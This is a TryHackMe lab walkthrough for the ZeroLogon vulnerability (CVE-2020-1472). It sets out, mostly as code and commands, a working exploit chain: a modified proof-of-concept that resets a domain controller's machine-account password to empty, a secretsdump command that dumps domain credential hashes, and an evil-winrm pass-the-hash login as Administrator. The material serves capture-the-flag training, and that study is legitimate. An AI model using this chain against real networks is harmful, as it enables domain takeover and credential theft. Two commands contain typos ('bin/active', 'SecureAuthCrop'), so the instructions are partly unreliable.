# ZeroLogon

Link: [THM-Zero-Logon](https://tryhackme.com/room/zer0logon)

* CVE-2020-1472
* Zero to Domain Admin in ~1 minute

## High-Level Overview

Exploit Zero Logon vulnerability to bypass authentication on the Domain Controller's Machine Account; Run `secretsdump.py` to dump credentials; Crack/pass Domain Admin Hashes; Domain admin

## Tools Needed

* Nmap
* Python
* Impacket
* Evil-WinRM

## Short Walkthrough

* First download the Proof of Concept (POC) exploit from Secura:

```bash
wget https://raw.githubusercontent.com/SecuraBV/CVE-2020-1472/master/zerologon_tester.py
```

* Add the following lines in the POC, immediately before the `return rpc_con` on line 45

```python
    newPassRequest = nrpc.NetrServerPasswordSet2()
    newPassRequest['PrimaryName'] = dc_handle + '\x00'
    newPassRequest['AccountName'] = target_computer + '$\x00'
    newPassRequest['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
    auth = nrpc.NETLOGON_AUTHENTICATOR()
    auth = nrpc.NETLOGON_AUTHENTICATOR()
    auth['Credential'] = b'\x00' * 8
    auth['Timestamp'] = 0
    newPassRequest['Authenticator'] = auth
    newPassRequest['ComputerName'] = target_computer + '\x00'
    newPassRequest['ClearNewPassword'] = b'\x00' * 516
    rpc_con.request(newPassRequest)
```

* Install `impacket`

```bash
$ python3 -m pip install virtualenv
$ python3 -m virtualenv impacketEnv
$ source impacketEnv/bin/active
$ pip install git+https://github.com/SecureAuthCrop/impacket
```

* Scan the active machine with `nmap` to identify the DC hostname as well as gather other information about the domain:

```bash
$ sudo nmap -sC -sV -A MACHINE:IP
```

* Run the zerologon POC against the `DC01` and vulnerable machine:

```bash
$ python3 zerologon_tester.py DC01 MACHINE:IP
```

* The script sets the new password to nothing so now we can use another `impacket` python script to dump the hashes from the DC:

```bash
$ secretsdump.py -just-dc -no-pass DC01\$@MACHINE:IP
```

* Using `evil-winrm` we can start a shell on the vulnerable DC and get the flag located on the Desktop of the Administrator user:

```bash
$ evil-winrm -u Administrator -H 3f3ef89114fb063e3d7fc23c20f65568 -i MACHINE:IP
```